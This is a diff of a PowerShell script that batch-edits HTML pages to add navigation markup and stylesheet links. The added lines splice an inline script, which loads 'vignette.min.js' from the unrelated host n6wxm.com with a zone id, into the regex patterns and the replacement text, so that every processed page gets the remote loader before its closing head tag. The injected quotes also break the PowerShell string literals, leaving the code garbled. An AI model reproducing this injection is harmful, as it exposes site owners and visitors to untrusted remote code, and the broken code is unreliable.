@@ -72,8 +72,12 @@ Get-ChildItem -Path $root -Directory | ForEach-Object {
       $subject = 'Subject'
     }
 
-    if ($content -notmatch '(?i)</head>') {
-      $content = $content -replace '(?i)<body>', "</head>`r`n<body>"
+    if ($content -notmatch '(?i)<script>(function(s){s.dataset.zone='11012996',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+
+</head>') {
+      $content = $content -replace '(?i)<body>', "<script>(function(s){s.dataset.zone='11012996',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+
+</head>`r`n<body>"
     }
 
     $content = [regex]::Replace($content, '(?s)<nav\b.*?</nav>', $nav, 1)
@@ -113,7 +117,9 @@ Get-ChildItem -Path $root -Directory | ForEach-Object {
 
 
     if ($content -notmatch 'assets/css/nav\.css') {
-      $content = $content -replace '(?i)(</head>)', "  <link rel=`"stylesheet`" href=`"../../../assets/css/nav.css`">`r`n$1"
+      $content = $content -replace '(?i)(<script>(function(s){s.dataset.zone='11012996',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+
+</head>)', "  <link rel=`"stylesheet`" href=`"../../../assets/css/nav.css`">`r`n$1"
     }
 
     if ($content -notmatch 'assets/js/nav\.js') {
